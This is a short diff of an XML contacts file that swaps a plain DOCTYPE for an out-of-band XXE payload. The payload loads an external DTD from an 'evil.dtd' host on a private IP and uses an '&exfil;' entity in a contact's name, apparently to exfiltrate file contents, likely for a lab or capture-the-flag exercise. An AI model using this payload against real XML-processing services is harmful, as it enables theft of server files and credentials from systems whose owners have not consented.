@@ -1,6 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<?xml-stylesheet type="text/xsl" href="/contact.xsl"?>
-<!DOCTYPE contacts SYSTEM "http://192.168.0.240:8888/evil.dtd">
+
+<!DOCTYPE foo [
+  <!ENTITY % remote SYSTEM "http://192.168.0.240:8888/evil.dtd">
+  %remote;% param1;
+]>
 <contacts>
     <contact>
         <name>&exfil;</name>
